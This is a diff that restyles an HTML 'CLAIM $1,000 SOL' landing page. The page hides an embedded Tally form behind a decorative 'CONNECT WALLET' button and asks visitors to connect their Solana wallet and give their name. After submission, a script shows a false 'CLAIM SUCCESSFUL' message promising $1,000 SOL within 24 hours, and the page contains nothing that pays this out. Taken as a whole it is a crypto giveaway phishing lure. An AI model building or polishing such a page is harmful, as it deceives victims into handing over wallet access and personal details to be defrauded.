@@ -7,69 +7,180 @@
     <link href="https://googleapis.com" rel="stylesheet">
     <style>
         :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
-        body { margin: 0; background: #000; color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
         
-        .card { width: 85%; max-width: 420px; background: #080808; border: 1px solid rgba(0, 255, 163, 0.15); border-radius: 40px; padding: 50px 30px; text-align: center; box-shadow: 0 0 100px #000; position: relative; min-height: 400px; transition: 0.5s; }
-        
-        h1 { font-family: 'Syncopate', sans-serif; font-size: 1.3rem; margin-bottom: 15px; background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1px; }
-        
-        .sub { font-size: 0.85rem; color: #777; margin-bottom: 25px; line-height: 1.6; }
+        body { 
+            margin: 0; 
+            background: radial-gradient(circle at center, #111 0%, #000 100%);
+            color: #fff; 
+            font-family: 'Space Grotesk', sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            overflow: hidden; 
+        }
 
-        /* FORM VIEW */
-        #form-view { display: block; }
-        .form-wrapper { position: relative; width: 100%; height: 260px; overflow: hidden; border-radius: 20px; }
-        iframe { width: 100%; height: 450px; border: none; position: absolute; top: -25px; left: 0; }
+        .card { 
+            width: 90%; 
+            max-width: 450px; 
+            background: rgba(10, 10, 10, 0.98); 
+            border: 1px solid rgba(0, 255, 163, 0.2); 
+            border-radius: 50px; 
+            padding: 60px 35px; 
+            text-align: center; 
+            box-shadow: 0 0 120px rgba(0, 255, 163, 0.1);
+            position: relative;
+            transition: all 0.5s ease;
+        }
 
-        /* SUCCESS VIEW - Hidden by default */
-        #success-view { display: none; opacity: 0; transform: translateY(20px); transition: 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-        .success-h { font-family: 'Syncopate', sans-serif; font-size: 1.4rem; color: var(--sol-g); margin-bottom: 25px; text-shadow: 0 0 20px rgba(0, 255, 163, 0.4); }
-        .congrats { font-size: 1.05rem; line-height: 1.8; color: #fff; padding: 35px; background: rgba(0, 255, 163, 0.05); border-radius: 30px; border: 1px dashed var(--sol-g); box-shadow: inset 0 0 20px rgba(0, 255, 163, 0.05); }
+        h1 { 
+            font-family: 'Syncopate', sans-serif; 
+            font-size: 1.8rem; 
+            margin-bottom: 10px; 
+            background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); 
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+            letter-spacing: -1px;
+            text-transform: uppercase;
+        }
 
-        /* CUSTOM BUTTON OVERLAY */
-        .custom-btn { position: absolute; bottom: 35px; left: 0; width: 100%; padding: 22px; background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); color: #fff; font-family: 'Syncopate', sans-serif; font-weight: 700; font-size: 0.75rem; border-radius: 18px; pointer-events: none; z-index: 10; box-shadow: 0 10px 30px rgba(0, 255, 163, 0.2); }
+        .label-head {
+            color: var(--sol-g);
+            font-family: 'Syncopate', sans-serif;
+            font-size: 0.95rem;
+            letter-spacing: 5px;
+            margin-bottom: 25px;
+            display: block;
+            text-shadow: 0 0 15px rgba(0, 255, 163, 0.4);
+        }
+
+        .sub { font-size: 1.1rem; color: #888; margin-bottom: 35px; line-height: 1.5; font-weight: 500; }
+
+        /* FORM SECTION */
+        .form-container {
+            position: relative;
+            width: 100%;
+            height: 280px; 
+            overflow: hidden;
+            border-radius: 25px;
+        }
+
+        iframe {
+            width: 100%;
+            height: 500px;
+            border: none !important;
+            position: absolute;
+            top: -20px; 
+            left: 0;
+        }
+
+        .btn-overlay {
+            position: absolute;
+            bottom: 45px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 90%;
+            padding: 24px 0;
+            background: linear-gradient(135deg, var(--sol-g), var(--sol-p));
+            color: #fff;
+            font-family: 'Syncopate', sans-serif;
+            font-weight: 700;
+            font-size: 0.9rem;
+            border-radius: 22px;
+            pointer-events: none; 
+            box-shadow: 0 15px 40px rgba(0, 255, 163, 0.3);
+            z-index: 10;
+        }
+
+        /* SUCCESS SECTION - ADVANCED EDIT */
+        #success-view { 
+            display: none; 
+            animation: slideUp 0.8s cubic-bezier(0.19, 1, 0.22, 1) forwards;
+        }
+
+        .success-icon {
+            font-size: 4rem;
+            margin-bottom: 20px;
+            display: inline-block;
+            background: linear-gradient(135deg, var(--sol-g), #fff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 0 15px rgba(0, 255, 163, 0.5));
+        }
+
+        .success-h { 
+            font-size: 2.2rem !important; 
+            color: var(--sol-g); 
+            margin-bottom: 30px;
+            text-shadow: 0 0 30px rgba(0, 255, 163, 0.3);
+        }
+
+        .congrats-box { 
+            font-size: 1.25rem; 
+            padding: 40px 30px; 
+            border: 1px solid rgba(0, 255, 163, 0.3); 
+            border-radius: 40px; 
+            background: linear-gradient(145deg, rgba(0, 255, 163, 0.05), rgba(220, 31, 255, 0.05));
+            line-height: 1.8;
+            box-shadow: inset 0 0 30px rgba(0, 0, 0, 0.5);
+        }
+
+        b { color: var(--sol-g); text-shadow: 0 0 5px rgba(0, 255, 163, 0.3); }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(40px) scale(0.9); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <!-- CLAIM SECTION -->
+    <div class="card" id="main-card">
+        <!-- FORM VIEW -->
         <div id="form-view">
             <h1>CLAIM $1,000 SOL</h1>
-            <p class="sub">To claim the $1,000 SOL, connect your solana wallet with your name</p>
-            <div class="form-wrapper">
-                <div class="custom-btn">CONNECT WALLET</div>
-                <iframe data-tally-src="https://tally.so" loading="lazy"></iframe>
+            <p class="sub">Connect your Solana wallet to receive rewards</p>
+            
+            <span class="label-head">SOLANA123</span>
+
+            <div class="form-container">
+                <div class="btn-overlay">CONNECT WALLET</div>
+                <iframe 
+                    data-tally-src="https://tally.so" 
+                    loading="lazy">
+                </iframe>
             </div>
         </div>
 
-        <!-- SUCCESS SECTION -->
+        <!-- SUCCESS VIEW (Advanced Design) -->
         <div id="success-view">
+            <div class="success-icon">✓</div>
             <h1 class="success-h">CLAIM SUCCESSFUL</h1>
-            <div class="congrats">
-                Congrats, you have claimed $1,000 SOL and you’ll receive the $1,000 SOL to your wallet address within 24 hrs
+            <div class="congrats-box">
+                Congrats, you have claimed <b>$1,000 SOL</b> and you’ll receive the <b>$1,000 SOL</b> to your wallet address within 24 hrs.
             </div>
         </div>
     </div>
 
     <script async src="https://tally.so"></script>
     <script>
-        // THIS DETECTS THE TALLY SUBMISSION
-        window.onmessage = (e) => {
+        // Listen for the Tally submission signal
+        window.addEventListener('message', (e) => {
             if (e.data && e.data.includes('Tally.FormSubmitted')) {
+                const card = document.getElementById('main-card');
                 const formView = document.getElementById('form-view');
                 const successView = document.getElementById('success-view');
-                
-                // Switch Views
-                formView.style.display = 'none';
-                successView.style.display = 'block';
-                
-                // Trigger Animation
+
+                // Advanced smooth transition
+                formView.style.opacity = '0';
                 setTimeout(() => {
-                    successView.style.opacity = '1';
-                    successView.style.transform = 'translateY(0)';
-                }, 100);
+                    formView.style.display = 'none';
+                    successView.style.display = 'block';
+                    card.style.borderColor = 'rgba(220, 31, 255, 0.4)'; // Glow purple on success
+                    card.style.boxShadow = '0 0 150px rgba(220, 31, 255, 0.15)';
+                }, 400);
             }
-        };
+        });
     </script>
 </body>
 </html>
